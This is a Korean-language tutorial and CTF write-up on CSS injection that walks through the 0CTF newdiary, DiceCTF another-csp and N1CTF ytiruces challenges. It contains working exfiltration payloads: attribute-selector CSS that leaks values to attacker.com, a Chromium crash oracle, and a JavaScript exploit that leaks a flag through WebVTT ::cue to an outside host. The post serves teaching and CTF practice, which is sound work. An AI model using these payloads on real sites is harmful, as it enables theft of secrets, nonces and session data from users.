---
title: CSS injection#1
description: 다양한 CSS injection을 배워봅시다.
author: 임예준(Burnnnnny)
date: 2024-10-14 02:17:33 +0900
tags: [Tech, Webhacking, CTF]
categories: [Tech, Webhacking, CTF]
comments: false
math: true
mermaid: false
pin: false
image: /assets/img/CSS_injection/CSS_injection_thumbnali.png
---

## 목차
1. CSS injection
2. CSS Attribute Selector
3. 0CTF 2023-newdiary
4. Dice CTF 2024-another-csp
5. N1CTF 2023-ytiruces
6. comment
7. Reference

---

<br>
안녕하세요! Knights of the SPACE의 멤버로 활동하고 있는 임예준(Burnnnnny)입니다.

Client side 기법 중 하나인 CSS injection에 대해 알아보도록 하겠습니다.

이번에는 CSS injection에 대한 기본적인 개념 설명과 CTF 문제로 알아보는 다양한 CSS injection 기법을 소개하도록 하겠습니다.

### 배경지식
CSS injection에 대한 기본적인 개념을 간단히 설명하긴 하지만 CSS injection에 관련된 CTF나 워게임 풀이 경험이 있다면 해당 문서 내용을 이해하는 데 도움이 됩니다.

---
### CSS injection
CSS injection은 웹페이지에 임의의 CSS 구문을 삽입하거나 <style> 태그를 사용하여 악의적인 스타일을 주입하는 공격 기법을 말합니다.

보통 HTML을 주입할 수 있으나 CSP(Content Security Policy)에 의해 JavaScript를 사용할 수 없는 경우나 DOMPurify로 인해 위험한 태그들이 sanitize 됐을 때 CSS로 악의적인 행동을 수행할 수 있습니다.

또한 CSS는 외부 리소스를 불러오는 기능을 제공하기 때문에 외부 서버로 요청을 보낼 수 있습니다. 

> DOMPurify는 기본적으로 독립된 <style> 태그는 sanitize하지만, 다른 태그 내부에 중첩된 <style> 태그는 sanitize하지 않습니다.

![DOMPurify Example 1](/assets/img/CSS_injection/1.png){: width="60%" style="display: block; margin: 0 auto 25px auto; border: 2px dashed #000; padding: 10px; box-sizing: border-box;"}

![DOMPurify Example 2](/assets/img/CSS_injection/2.png){: width="60%" style="display: block; margin: 0 auto; border: 2px dashed #000; padding: 10px; box-sizing: border-box;"}


---

### CSS 특성 선택자

CSS 특성 선택자는 요소의 특성을 선택할 수 있는 기능을 제공합니다. 
<br>

| 구문 | 설명 |
|------|------|
| `[attr]` | `attr` 이라는 이름의 특성을 가진 요소를 선택합니다. |
| `[attr=value]` | `attr` 이라는 이름의 특성값이 정확히 `value` 인 요소를 선택합니다. |
| `[attr~=value]` | `attr` 이라는 이름의 특성값이 정확히 `value` 인 요소를 선택합니다. `attr` 특성은 공백으로 구분한 여러 개의 값을 가지고 있을 수 있습니다. |
| `[attr^=value]` | `attr` 이라는 특성값을 가지고 있으며, 접두사로 `value` 가 값에 포함되어 있으면 이 요소를 선택합니다. |
| `[attr$=value]` | `attr` 이라는 특성값을 가지고 있으며, 접미사로 `value` 가 값에 포함되어 있으면 이 요소를 선택합니다. |
|  `[attr*=value]` | `attr`이라는 특성값을 가지고 있으며, 값 안에 `value`라는 문자열이 적어도 하나 이상 존재한다면 이 요소를 선택합니다. |



CSS injection은 기본적으로 CSS 특성 선택자를 이용하여 조건이 맞을 경우에 외부서버로 요청을 보내 HTML요소의 값을 유출합니다.  

---

#### tip!

CTF 문제를 풀 때 많은 참가자들이 `[attr^=value]` 선택자만을 사용하여 CSS injection을 수행합니다.

이 방식은 각 문자를 하나씩 유출해야 하므로, 이론상 (사용 가능한 문자 수 X 유출하려는 요소의 데이터 길이)만큼의 요청이 필요해 익스플로잇을 하는데 많은 시간이 걸립니다.

하지만 더욱 효율적인 방법이 있습니다!

1. `[attr$=value]` 선택자 활용: 
   접두사(`^`)뿐만 아니라 접미사(`$`)도 함께 유출하면 필요한 요청 횟수를 절반으로 줄일 수 있습니다.

2. 병렬 요청 활용: 
   여러 선택자를 한 번에 요청하여 익스플로잇 시간을 대폭 단축할 수 있습니다. 

**코드예시**
```css
<style>
input[name="secret"][value^="da"] { background: url(https://attacker.com/leak?q=da) }
input[name="secret"][value^="db"] { background: url(https://attacker.com/leak?q=db) }
input[name="secret"][value^="dc"] { background: url(https://attacker.com/leak?q=dc) }
/* ... 중략 ... */
input[name="secret"][value^="dz"] { background: url(https://attacker.com/leak?q=dz) }
</style>

```

이렇게 하면 한 번의 요청으로 여러 가능성을 동시에 테스트할 수 있어, 전체 익스플로잇 과정의 속도를 크게 향상시킬 수 있습니다.

이러한 최적화 기법들을 적절히 조합하면, CSS injection 공격의 효율성을 크게 높일 수 있습니다.

---
### 0CTF 2023-newdiary
2023년 0CTF에서 출제된 newdiary라는 문제와 함께 일명 **'One-shot CSS injection'**을 설명하도록 하겠습니다. 

**'One-shot CSS injection'**은 이름처럼 유출하고자 하는 데이터를 한번에 유출하는 기법입니다. 


전체 풀이 설명보단 원리를 위주로 설명할 예정이니 전체 풀이가 궁금하신 분들은 Reference를 참고해주시면 됩니다.

해당 문제의 소스코드가 궁금하신 분은 [ctf-archives](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/0CTF/2023/web/newdiary)깃허브에서 소스코드를 확인해 보실 수 있습니다. 

newdiary는 innerHTML을 사용하여 DOM 기반 XSS가 가능하며, 이를 통해 FLAG가 담긴 쿠키를 탈취하는 문제입니다.

그러나 
```html
<meta http-equiv="Content-Security-Policy"
    content="script-src 'nonce-<%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com">
```
다음과 같이 CSP에 `nonce`가 걸려있었고 `nonce`의 조합이 `a-zA-Z0-9`이며 32자 길이고 각 요청마다 `nonce`가 바뀝니다. 

그러나 `unsafe-inline`으로 인해 `<style>`태그가 사용이 가능하고 `unpkg.com`에서 파일을 업로드해 외부 CSS 사용이 가능합니다.  

그리고 `<meta>`태그내에 `nonce`가 있기 때문에 CSS로 `nonce`를 유출할 수 있습니다.

그럼 어떻게 한 번의 CSS injection 요청으로 nonce를 유출한 뒤 XSS를 통해 쿠키를 얻을 수 있을까요?

문제를 푸는데 가장 중요한 개념은 `[attr*=value]` 입니다.  

`[attr*=value]`는 `attr`이라는 특성값을 가지고 있으며, 값 안에 `value`라는 문자열이 적어도 하나 이상 존재한다면 

이 요소를 선택하는 CSS 특성선택자입니다. 

먼저 텍스트 조각들을 각각 3개의 문자를 포함하는 많은 작은 부분 문자열로 나눕니다. 

**코드예시**
```css
script[nonce*='aaa']{ --aaa: url('http://attacker.com/leak?x=aaa'); }
script[nonce*='aab']{ --aab: url('http://attacker.com/leak?x=aab'); }
script[nonce*='aac']{ --aac: url('http://attacker.com/leak?x=aac'); }
script[nonce*='aad']{ --aad: url('http://attacker.com/leak?x=aad'); }
script[nonce*='aae']{ --aae: url('http://attacker.com/leak?x=aae'); }
script[nonce*='aaf']{ --aaf: url('http://attacker.com/leak?x=aaf'); }
script[nonce*='aag']{ --aag: url('http://attacker.com/leak?x=aag'); }
script[nonce*='aah']{ --aah: url('http://attacker.com/leak?x=aah'); }
script[nonce*='aai']{ --aai: url('http://attacker.com/leak?x=aai'); }
script[nonce*='aaj']{ --aaj: url('http://attacker.com/leak?x=aaj'); }
script[nonce*='aak']{ --aak: url('http://attacker.com/leak?x=aak'); }

script{
  display: block;
  background-image: -webkit-cross-fade(
    var(--aaa, none),
    -webkit-cross-fade(
      var(--aab, none), var(--ZZZ, none), 50%
    ),
    50%
  )
```
`-webkit-cross-fade`를 사용하는 것은 여러 이미지를 로드하기 위함입니다. 

`nonce`를 예를 들어 `hspace`라고 가정해보겠습니다.

- ?x=hsp
- ?x=spa
- ?x=pac
- ?x=ace

다음과 같이 서버가 요청을 받을 겁니다. 

그러면 일부 문자가 겹쳐 규칙에 따라 결합하면 전체 `nonce`를 얻을 수 있습니다. 

해당 문제에 쓰인 기법을 직접 테스트해보고 싶으신 분들은 [sCSSLeak](https://github.com/ixSly/sCSSLeak)에서 git clone 한 뒤 테스트 해보실 수 있습니다. 


**'One-shot CSS injection'**은 특정 경우에서만 사용가능하지만 한번에 데이터전체를 유출한다는 점에서

제가 위에서 설명한 tip보다 훨씬 강력한 기법입니다. 

---

### Dice CTF 2024-another-csp
2024년 Dice CTF에서 출제된 another-csp라는 문제와 함께 Chromium Crash로 정보를 유출하는 방법을 설명하도록 하겠습니다.

해당 문제의 소스코드가 궁금하신 분은 [dicegang](https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/web/another-csp)깃허브에서 소스코드를 확인해 보실 수 있습니다. 


소스코드를 간단히 설명하자면 봇이 현재 실행중인지 아닌지를 확인할 수 있으며 문제서버의 token을 안다면 FLAG를 얻을 수 있습니다.


#### index.html
```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>another-csp</title>
	<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">
</head>
<body>
	<iframe id="sandbox" name="sandbox" sandbox></iframe>
</body>
<script>
	document.getElementById('form').onsubmit = e => {
		e.preventDefault();
		const code = document.getElementById('code').value;
		const token = localStorage.getItem('token') ?? '0'.repeat(6);
		const content = `<h1 data-token="${token}">${token}</h1>${code}`;
		document.getElementById('sandbox').srcdoc = content;
	}
</script>
</html>
```
`iframe`의 sandbox와 CSP또한 `default-src 'none';`으로 상당히 엄격하게 설정되어있는 것을 확인할 수 있습니다. 

sandbox때문에 javaScript도 쓸 수 없으면서 
보통의 CSS injection은 `img-src`나 `font-src` CSP가 허용된 경우 외부에 요청을 보내 유출하지만 CSP가 `default-src 'none'`으로 외부로는 요청보내기 어렵습니다. 


해당 문제를 푸는 방법은 무거운 CSS를 적용하여 브라우저의 크래시 발생 여부로 token을 유출하는 문제입니다.

[CSS:Using a color made with color-mix in relative color syntax causes the tab to crash with a SIGILL](https://issues.chromium.org/issues/41490764)

해당 버그를 이용하여 크래시를 발생시킵니다. 

```html
<style>
  h1[data-token^="a"] {
    --c1: color-mix(in srgb, blue 50%, red);
    --c2: srgb(from var(--c1) r g b);
    background-color: var(--c2);
  }
</style>
```
혼합색상을 사용하여 `data-token`이 접두사로 일치한다면 브라우저 오류를 일으켜, 웹페이지가 로드되는 시간을 길게하여 브라우저 상태를 파악해 token을 유출합니다. 

그런데 해당 코드는 현재 브라우저에서는 패치된듯 보이고 변수를 중첩하여 생성하는 CSS는 현재 크로미움 브라우저(버전 129.0.6668.101)에서도 크래시가 발생하는 모습을 볼 수 있습니다. 


**코드예시**
```html
<h1 data-token="abcd123">abcd123</h1>

<style>
   html:has([data-token^="a"]) {
      --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
      --b: var(--a),var(--a),var(--a),var(--a),var(--a);
      --c: var(--b),var(--b),var(--b),var(--b),var(--b);
      --d: var(--c),var(--c),var(--c),var(--c),var(--c);
      --e: var(--d),var(--d),var(--d),var(--d),var(--d);
      --f: var(--e),var(--e),var(--e),var(--e),var(--e);
      --g: var(--f),var(--f),var(--f),var(--f),var(--f);
  }
  *{
    background-image: var(--g)
  }
</style>
```
직접 브라우저에서 실행시 아래 사진과 같이 STATUS_STACK_OVERFLOW 오류가 발생한 모습을 볼 수 있습니다. 

![3](/assets/img/CSS_injection/3.png)


CSS injection이 가능하지만 CSP로 인해 외부 요청이 막혔을 때도 정보를 유출할 수 있다는 점에서 흥미로운 기법이라고 생각합니다

---

### N1CTF 2023-ytiruces

2023년 N1CTF에서 출제된 ytiruces라는 문제와 함께 다른 페이지의 정보를 유출하는 공격 기법인 **webVTT cue XS-Leak**을 설명하도록 하겠습니다.

해당 문제의 전체 소스코드가 궁금하신 분은 [Nu1LCTF](https://github.com/Nu1LCTF/n1ctf-2023/tree/main/web/ytiruces) 깃허브에서 확인해 보실 수 있습니다. 

**webVTT cue XS-Leak**은 HTML과 CSS를 함께 주입하면서 기존의 CSS injection과 달리 공격 벡터가 다른 경로에 위치한 정보를 유출하는 기법입니다. 

#### app.js

```js
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const port = 3000;

app.use(cookieParser());
app.use('/static', express.static('static'))
app.use((req, res, next) => {
    res.set("X-Frame-Options", "DENY");
    res.set(
      "Content-Security-Policy", 
      "style-src 'unsafe-inline'; script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"
    );
    next();
  });
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.get('/flag', (req, res) => {
    res.type('text/plain');
    const name = req.query.name || 'admin';
    if (typeof name !== 'string' || name.length > 32 || /[^\x00-\x7f]/.test(name)) {
        res.send('Invalid name!');
        return;
    }
    const flag = req.cookies.flag || 'n1ctf{[A-Za-z]+}';
    res.send(`${name} ${flag}`);
});

app.listen(port, '0.0.0.0', () => {
    console.log(`App listening at http://0.0.0.0:${port}`);
});
```

app.js코드의 CSP를 보면 DOMPurify와 inline-css가 허용되어 CSS injection이 가능합니다.

그리고 '/flag' 경로에서 쿼리값의 타입,길이,아스키범위 검사 이후 `${name} ${flag}` 이런 형태로 `text/plain` MIME type 응답을 반환합니다.   


#### index.html
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>YTIRUCES</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
    <script src="/static/init.js"></script>
</head>
<body>
    <header>
        <h1>YTIRUCES</h1>
    </header>
    <nav>
        <a href="#home">Home</a>
    </nav>
    <div class="container">
        <article>
          loading...
        </article>
    </div>
</body>
</html>
```

#### /static/init.js
```js
window.addEventListener('load', function() {
    var params = new URLSearchParams(window.location.search);
    var danger_content = params.get('content') || "!dlrow olleH";
    var content = DOMPurify.sanitize(danger_content);
    document.querySelector('article').innerHTML = content;
});
```

init.js를 보면 메인 페이지에서 DOMPurify에 의해 XSS가 막혔지만 HTML injection이 가능합니다.

그럼 이제 어떻게 FLAG를 유출할 수 있을까요?

여기서 필요한 배경지식은 WebVTT, `<track>` 태그, `::cue`라는 CSS 의사요소입니다.

**배경지식**
>WebVTT는 비디오나 오디오와 함께 표시되는 텍스트 트랙을 정의하는 파일 형식입니다. 주로 자막, 캡션, 챕터 등을 표현하는 데 사용됩니다.

>`::cue`는 WebVTT 큐의 텍스트 콘텐츠를 스타일링하는 데 사용되는 CSS 의사 요소입니다. 이를 통해 자막이나 캡션의 스타일을 세밀하게 제어할 수 있습니다.

>`<track>` 태그는 HTML5 `<video>` 또는 `<audio>` 요소의 자식으로 사용되며, 외부 텍스트 트랙 파일(예: WebVTT 파일)을 지정합니다. 이를 통해 비디오나 오디오에 자막, 캡션 등을 추가할 수 있습니다.

해당 배경지식들은 웹에서 비디오나 오디오의 자막에 쓰이는 개념들입니다.


푸는 방법을 간단히 요약하자면 외부에서 `<video>`를 가져온 뒤 <track> 태그로 '/flag'경로를 webVTT texttrack으로 처리하고 `::cue`로 CSS 선택자로 조건이 맞는 FLAG를 공격자 사이트로 유출하는 기법입니다. 

먼저 '/flag'경로는 임의 문자열을 FLAG앞에 위치할 수 있습니다. 그리고 개행 또한 가능합니다.

그럼 공격 방법을 단계별로 설명하겠습니다:

1. 외부 비디오 소스를 참조하는 `<video>` 태그를 삽입합니다.
2. `<video>`태그 내부에 `<track>` 태그를 추가합니다.
3. `<track>` 태그의 src 속성을 '/flag' 경로로 설정하고, 추가 파라미터를 포함시킵니다.
4. 이 파라미터에 WebVTT 형식의 헤더와 타임스탬프를 포함시켜 '/flag' 경로의 응답을 WebVTT 파일로 해석되도록 합니다.

이를 구현한 페이로드는 다음과 같습니다:

```html
<video muted autoplay controls src="//attacker.com/a.mp3">
  <track default src="/flag?name=WEBVTT%0d00:00.000-->00:30.000%0d<v"/>
  <style>CSS injection payload...</style>
</video>
```

그리고 `<stlye>`태그안에 `::cue`로 FLAG를 CSS injection으로 유출합니다.

#### exploit
```js
let base = 'https://ytiruces.ctfpunk.com';
let base2 = '/?content=%3Cvideo%20muted%20autoplay%20controls%20src=//o.cal1.cn/s.mp3%3E%3Ctrack%20default%20src=%22/flag?name=WEBVTT%250d00:00.000--%3E00:30.000%250d%3Cv%22/%3E%3Cstyle%3E$CSS$%3C/style%3E%3C/video%3E';

let genCSS = (known,u)=>{
    let pool = [
       [...'abcdefghi'], 
       [...'jklmnopqr'], 
       [...'stuvwxyz'], 
       [...'ABCDEFGHI'], 
       [...'JKLMNOPQR'], 
       [...'STUVWXYZ}'],
   ];
    let ret = '';
    for (let i of pool[u]) {
        ret += `::cue(v[voice^=%22${known}${i}%22]){background:url(//o.cal1.cn/?${known}${i})}`
    }
    return ret
}

let known = 'n1ctf{';

console.log([
    base + base2.replace('$CSS$', genCSS(known, 0)),
    base + base2.replace('$CSS$', genCSS(known, 1)),
    base + base2.replace('$CSS$', genCSS(known, 2)),
    base + base2.replace('$CSS$', genCSS(known, 3)),
    base + base2.replace('$CSS$', genCSS(known, 4)),
    base + base2.replace('$CSS$', genCSS(known, 5)), 
])

```


참고로 거의 비슷한 기법이 ASIS CTF 2021 본선에서 classic이란 문제로 등장했었습니다.
- [ASIS 2021 final web classic](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/ASIS/2021/Finals/web/classic/stuff) 

- [parrot409-poc for classic](https://gist.github.com/parrot409/34194eb82b32e36d2a96d0bf3115a901)

상황자체는 조금 다르지만 기법 자체는 비슷해 보입니다. 

여담이지만 저의 경우 2024년에 진행한 YISF(순천향대 청소년 정보보호 페스티벌) 예선에 해당 기법을 이용한 문제를 출제하였습니다.

[cinema](https://dreamhack.io/wargame/challenges/1380)란 문제로, 현재 드림핵에 포팅되어 있으니 기법을 이해하셨으면 직접 한번 풀어보는 것을 추천하겠습니다.

---

### comment
CTF에서 나온 새롭고 창의적인 기법들을 이해한 뒤 문서로 정리하는 작업이 힘들지만 재밌었습니다.

그리고 CSS injection은 저 개인적으로 JavaScript없이 Leak한다는 점에서 흥미로운 기법이라고 생각합니다.
 
이번에 작성한 문서가 CSS injection을 공부하시려는 분들에게 도움이 되길 바랍니다.🙂

---

### Reference
- [DOMPurify 3.1.7 "Glow Stick"](https://cure53.de/purify)
- [mdn-css-Attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)
- [CSS Injection: Attacking with Just CSS (Part 1)](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/)
- [CTF-archives-0CTF 2023-newdiary](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/0CTF/2023/web/newdiary)
- [salvatore-abello-newdiary](https://github.com/salvatore-abello/CTF-Writeups/tree/main/0ctf%20-%202023/newdiary#css-exploit)
- [Code Vulnerabilities Put Proton Mails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/#leaking-a-blob-url)
- [ixSly-sCSSLeak](https://github.com/ixSly/sCSSLeak)
- [huli-0CTF 2023 Writeups](https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/)
- [huli-DiceCTF 2024 Writeup](https://blog.huli.tw/2024/02/12/en/dicectf-2024-writeup/#webx2fsafestlist-2-solves)
- [0xOne - 2024 Dice CTF Write up \[Web\]](https://one3147.tistory.com/77)
- [huli-A Bunch of Web and XSS Challenges](https://blog.huli.tw/2023/12/03/en/xss-and-web-challenges/)
- [WebVTT_API](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API)
- [N1CTF复现游记](https://dem0dem0.top/2023/10/20/n1ctf2023/)